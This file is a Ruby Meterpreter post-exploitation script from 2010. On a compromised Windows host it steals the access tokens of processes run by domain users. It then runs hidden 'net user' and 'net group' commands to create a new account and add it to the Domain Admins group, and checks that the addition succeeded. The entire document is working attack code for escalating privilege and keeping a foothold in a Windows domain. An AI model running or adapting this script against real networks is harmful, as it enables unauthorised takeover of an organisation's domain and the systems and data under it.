# This script adds a new user to the Domain Admins group if a 
# Domain Admin is logged on the compromised system and we have 
# sufficient privileges for token kidnapping
#
# Version: 0.1 - 2010.12.28. 02:36
# by vpb 

def try_add(u,pwd)
	processes=client.sys.process.get_processes
	sysinfo=client.sys.config.sysinfo
	good_processes=Array.new

	processes.each do |p|
		udata=p['user'].split(/\\/)
		#print udata
		if (!udata.nil? and !udata[0].nil? and udata[0]!="NT AUTHORITY") and udata[0]!=sysinfo['Computer'] then
			print_status("Pid found: "+p['pid'].to_s+" - '"+p['user']+"' \n")
			good_processes << p['pid']
		end	
	end

	if good_processes.size>0 then
		good_processes.each do |p| 
			print_status("Token stolen: "+client.sys.config.steal_token(p))
		
			client.sys.process.execute("cmd /c net user #{u} #{pwd} /add /domain", nil, {'Hidden' => true, 'Channelized' => false, 'UseThreadToken'=>true})
			client.sys.process.execute("cmd /c net group \"Domain Admins\" #{u} /add /domain", nil, {'Hidden' => true, 'Channelized' => false, 'UseThreadToken'=>true})
			
			chk=client.sys.process.execute("cmd /c net group \"Domain Admins\" /domain", nil, {'Hidden' => true, 'Channelized' => true, 'UseThreadToken'=>true})
			c_full=[]
			while(c=chk.channel.read) do
				c_full << c 
			end

			if (!c_full.join.match(/(.*) #{u} (.*)/).nil?) then
				print_status("User #{u} added to the Domain Admins group!")
				return
			end
		end
	else
		print_error("No appropriate process found :(")
	end
end

@@exec_opts = Rex::Parser::Arguments.new(
	"-h"	=>	[false, "Help menu"],
	"-u"	=>	[true,"Name of the user to add"],
	"-p"	=>	[true,"Password of the user to add"]
)

user=nil
pass=nil

# Parsing of Options
@@exec_opts.parse(args) { |opt, idx, val|
	case opt
	when "-u"
		user=val
	when "-p"
		pass=val	
  	when "-h"
    		print(
      		"TODO Meterpreter Script\n" +
      		"Usage:\n" +
        	@@exec_opts.usage
    		)
    		helpcall = 1
  	end

}

if client.platform =~ /win32|win64/
        if user != nil && pass!=nil
                try_add(user,pass)
        elsif helpcall == nil
                print(
                        "TODO Meterpreter Script\n" +
                          "Usage: \n" +
                          @@exec_opts.usage)
        end

else
        print_error("This version of Meterpreter is not supported with this Script!")
        raise Rex::Script::Completed
end

